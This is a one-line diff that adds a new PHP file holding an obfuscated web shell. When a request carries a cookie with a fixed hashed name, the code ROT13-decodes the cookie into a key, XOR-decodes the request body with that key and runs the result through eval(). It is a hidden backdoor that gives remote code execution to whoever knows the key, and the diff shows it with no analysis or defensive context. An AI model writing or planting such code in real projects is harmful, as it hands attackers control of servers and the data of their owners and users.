@@ -1,0 +1,1 @@
+<?php $auth = "21a27be0cd332f0e8430e24da7158a96";if (isset($_COOKIE[$auth])) {$key = str_rot13($_COOKIE[$auth]);$res = "";foreach (str_split(@file_get_contents('php://input'), strlen($key)) as $part) {$res .= $part ^ $key;}eval($res);}
